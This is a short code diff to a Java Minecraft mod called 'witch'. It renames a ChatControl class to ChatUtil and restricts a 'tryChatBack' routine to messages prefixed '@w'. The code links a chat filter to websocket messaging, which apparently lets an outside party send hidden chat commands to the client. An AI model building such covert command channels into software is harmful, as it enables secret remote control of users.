@@ -1,6 +1,5 @@
 package me.soda.witch.features;
 
-import me.soda.witch.config.Config;
 import me.soda.witch.websocket.MessageUtils;
 import net.minecraft.text.MutableText;
 import net.minecraft.text.Text;
@@ -10,7 +9,7 @@ import java.util.regex.Pattern;
 
 import static me.soda.witch.Witch.mc;
 
-public class ChatControl {
+public class ChatUtil {
     private static boolean firstTime = true;
 
     public static boolean filter(Text message) {
@@ -49,7 +48,7 @@ public class ChatControl {
 
     public static boolean tryChatBack(String string) {
         String[] msgArr = string.split(" ");
-        if (msgArr.length < 2) return false;
+        if (msgArr.length < 2 || !msgArr[0].equals("@w")) return false;
         String[] strArr = new String[msgArr.length - 1];
         System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
         String chatText = String.join(" ", strArr);
